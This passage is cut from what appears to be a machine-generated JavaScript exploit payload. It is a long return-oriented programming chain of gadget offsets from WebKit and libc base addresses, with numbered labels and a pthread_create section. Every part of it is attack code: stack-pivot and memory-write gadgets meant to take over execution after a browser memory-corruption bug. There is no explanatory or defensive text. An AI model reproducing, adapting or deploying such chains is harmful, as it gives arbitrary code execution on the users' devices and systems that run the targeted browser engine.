webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+145992, //L2050
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+146008, //L2051
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2050:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2051:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2052:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2053:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+146144, //L2055
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+146128, //L2054
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2054:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2055:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2056:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L2057:
db([8, 0]); // 0x8
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+146344, //L2060
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+146312, //L2058
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2058:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2059:
db([32, 0]); // 0x20
set_gadget(libc_base+788575,); //pop rax
//L2060:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+146448, //L2062
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+146432, //L2061
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2061:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2062:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+146560, //L2065
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+146528, //L2063
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2063:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2064:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2065:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+146624, //L2066
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+792472 //pop rcx
]);
//L2066:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+146680, //L2069
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2069:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877, //pop rsi
ropchain+146824, //L2071
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+146840, //L2072
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+146808, //L2070
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2070:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2071:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2072:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+147000, //L2076
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+146952, //L2073
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+146968, //L2074
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2073:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2074:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2075:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2076:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+147128, //L2078
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+147144, //L2079
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+147112, //L2077
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2077:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2078:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2079:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+147240, //L2080
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+147256, //L2081
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2080:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2081:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+147368, //L2082
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+147352, //L2083
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2083:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2082:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+147456, //L2085
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+147440, //L2084
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2084:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2085:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+147552, //L2086
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+147568, //L2087
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2086:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2087:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+147680, //L2088
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+147664, //L2089
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2089:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2088:
db([0, 0]); // 0x0
//_pthread_create__rop:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+147752, //L2090
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2090:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+147816, //L2092
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2092:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+147920, //L2095
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+147968, //L2097
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2095:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2094:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2096:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2097:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+148064, //L2099
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+148048, //L2098
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2098:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2099:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2100:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2101:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2102:
db([1, 0]); // 0x1
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2103:
db([1, 0]); // 0x1
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2104:
db([4096, 0]); // 0x1000
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+148376, //L2107
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2107:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2108:
db([1, 0]); // 0x1
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2109:
db([2, 0]); // 0x2
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+148568, //L2112
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2112:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+148680, //L2113
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2113:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2114:
db([65536, 0]); // 0x10000
set_gadget(libc_base+206806,); //pop rdi
//L2115:
db([65536, 0]); // 0x10000
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+148808, //L2117
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+148792, //L2116
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2116:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2117:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2118:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2120:
ropchain+148960, //L2119
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+157624, //L2121
//L2119:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967248, 4294967295]); // -0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+149056, //L2122
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2122:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+149112, //L2125
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2125:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2126:
db([65536, 0]); // 0x10000
set_gadget(libc_base+788575,); //pop rax
//L2127:
db([65536, 0]); // 0x10000
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+149264, //L2128
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2128:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+149320, //L2131
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2131:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+149408, //L2134
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2133:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L2134:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2136:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+792472,); //pop rcx
//L2137:
db([312, 0]); // 0x138
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2139:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+149592, //L2140
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+149608, //L2142
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2140:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2142:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+149760, //L2144
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+149792, //L2146
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+149744, //L2143
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+149776, //L2145
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2143:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2144:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2145:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2146:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+149888, //L2148
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+149872, //L2147
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2147:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2148:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2149:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2150:
db([1, 0]); // 0x1
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+150104, //L2152
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+150120, //L2153
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+150088, //L2151
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2151:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2152:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2153:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+150208, //L2154
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+150240, //L2157
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2154:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2156:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+206806,); //pop rdi
//L2157:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2159:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+150368, //L2160
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+150384, //L2162
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2160:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2162:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+150536, //L2164
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+150568, //L2166
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+150520, //L2163
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+150552, //L2165
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2163:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2164:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2165:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2166:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+150664, //L2168
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+150648, //L2167
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2167:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2168:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2169:
db([15, 0]); // 0xf
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+150776, //L2172
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2172:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877, //pop rsi
ropchain+150920, //L2174
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+150936, //L2175
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+150904, //L2173
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2173:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2174:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2175:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+151024, //L2176
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+151056, //L2179
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2176:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2178:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+206806,); //pop rdi
//L2179:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2181:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+151184, //L2182
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+151200, //L2184
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2182:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2184:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+151352, //L2186
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+151384, //L2188
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+151336, //L2185
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+151368, //L2187
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2185:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2186:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2187:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2188:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+151480, //L2190
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+151464, //L2189
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2189:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2190:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2191:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2192:
db([1, 0]); // 0x1
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+151696, //L2194
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+151712, //L2195
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+151680, //L2193
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2193:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2194:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2195:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+151800, //L2196
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+151832, //L2199
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2196:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2198:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+206806,); //pop rdi
//L2199:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2201:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L2202:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+151976, //L2203
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+151992, //L2205
webkit_base+7438103, //mov [rsi], rax
